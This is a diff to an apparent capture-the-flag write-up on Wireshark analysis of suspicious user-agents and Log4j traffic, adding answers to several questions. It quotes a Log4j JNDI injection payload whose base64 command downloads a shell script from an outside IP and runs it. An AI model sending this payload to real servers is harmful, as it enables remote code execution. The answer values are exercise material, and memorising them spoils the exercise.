@@ -578,11 +578,21 @@ This means each user-agent _should_ contain "one or more product identifiers, ea
 
 Now let's looks at Chrome. This user-agent specifies versions **[8.0.552.237](https://chromereleases.googleblog.com/2011/01/chrome-stable-release.html)**. This was released in January 12, 2011, long before Windows NT 6.4 was being used. By January 2014, the stable channel version of Chrome was already 32.0.1700.103. This means that someone would have to purposefully downgrade their Chrome version, which doesn't really make much sense from a security or features perspective. I would rank this one as the most suspicious so far. The previous one is also unusual though, since that is not normally how Chrome identifies itself.
 
-The remaining user-agent strings all appear to be normal.
+The remaining user-agent strings all appear to be normal. Even though the answer expects six anomalous user-agents, I would say that the real correct answer is seven, since the additional suspicious user-agents we found both show signs of being forged, either from a structural or logical perspective.
+
+**Answer**: 6
 
 ### Question 2 - What is the packet number with a subtle spelling difference in the user agent field?
+This was one of the anomalous user-agents we found during the previous question where it misspelled the word "Mozilla". We just need to search for that misspelled word in the packet capture using this filter: `http.user_agent matches "Mozlila"`.
+
+**Answer**: 52
 
 ### Question 3 - Locate the "Log4j" attack starting phase. What is the packet number?
+We actually saw a Log4j related packet in this packet capture while identifying anomalous user-agents:
+```
+user-agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+```
+However, for these next two questions, we need to switch to a different packet capture.
 
 ### Question 4 - Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
 
